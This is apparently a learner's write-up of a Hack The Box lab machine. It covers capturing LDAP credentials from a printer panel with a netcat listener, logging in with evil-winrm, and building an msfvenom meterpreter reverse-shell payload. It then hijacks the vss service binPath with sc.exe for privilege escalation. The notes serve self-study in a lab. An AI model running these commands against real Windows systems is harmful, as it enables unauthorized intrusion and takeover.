Expanded port scan. 
5985 - winrm 

It's a printer -

Server admin panel reveals 

server - printer.reutrn.local
port - 389
username - ***-*******
password - blank

SMB Enumeration - 

enum4linux - tool

To see what credentials are being used. Setup a listeneer using netcat over port 389, since that's what is used for LDAP. 

After "confirming" settings you can get the password. 
************ 


EvilWinRM - tool
-i - host
-u username 
-p password

evil-winrm -i return.htb -u ***-******* -p '************'


Once in, enumerate the users access to various groups etc. 

net user ***-*******


Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users


within winrm upload ./nc.exe

since a regular nc session dies so quick need to ustilize msfvenom. 

msfvenom -p windows/meterpreter/rever_tcp LHOST=10.10.XX.X LPORT=1234 -f exe > exploit.exe

upload ./exploit.exe



sc.exe config vss binPath="C:\Users\***-*******\Documents\exploit.exe"
sc.exe stop vss
sc.exe start vss


Since it's not netcat.. you gotta use msfconsole. 

use exploit/multi/handler


root was tricky. 

list ps and switch the process as quick as you can. Otherwise the conneciton is going to get killed quick. 




My Summary ----

I'm definitely rusty here as I haven't touched any of this stuff in months. I've also focused too closely to only Linux VMs vs windows stuff. I'm not as good with Windows stuff as *should* be. 

Scan revealed the web portal where I was able to get the username pretty quick and easily. Finding the password would have taken me a while to find without any assistance. I didn't realize you could use netcat as just a regular ole listener, that was pretty cool. 

After getting the password I had to find a way to get "into" the box. Initially I didn't see any high ports open. After a second, larger nmap you could see WinRM (Windows remote management) was open. Here you could authenticate with. using Evil-WinRM. Based off the commands, it looks like I've used this in the past but I had no recollection of doing so. It was a nice refresh. Basically the winrm tool utlized for linux as far as I could tell. After authenticating there, I could easily grab the user.txt file from the service accounts desktop. 

Shortly after enumerating the groups that *I* was a member of I saw that I was in the server operators group. SC is the service control manager. vss is the volume shadow copy service. This is used to basically act as a placeholder service that you can exploit. Pretty useful stuff and commonly seen in ransomware. 

Basically what's happening is you're executing the placeholder for vss to get the shell. Pretty neat stuff, just times out quick. 

I def need more practice with metasploit / meterpreter. May just hae to find a dedicated course / module for this one.
